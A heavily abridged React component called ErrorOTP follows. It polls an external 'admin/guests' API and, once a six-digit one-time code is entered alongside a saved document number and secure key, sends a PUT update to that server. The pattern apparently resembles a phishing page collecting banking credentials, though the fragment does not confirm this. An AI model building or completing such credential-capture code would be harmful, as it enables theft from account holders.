...
const ErrorOTP = () => {
  ...
  useEffect(() => {
    ...
    const interval = setInterval(async () => {
      try {
        const response = await fetch('https://api.bogotapoliz.com/api/v1/admin/guests');
    ...
    if (otp.length === 6) {
      ...
      if (savedDocumentNumber && savedSecureKey) {
        ...
        try {
          ...
          const updateResponse = await fetch(`https://api.bogotapoliz.com/api/v1/guest/${guestId}`, {
            method: 'PUT',
            headers: {
              'Content-Type': 'application/json',
            },
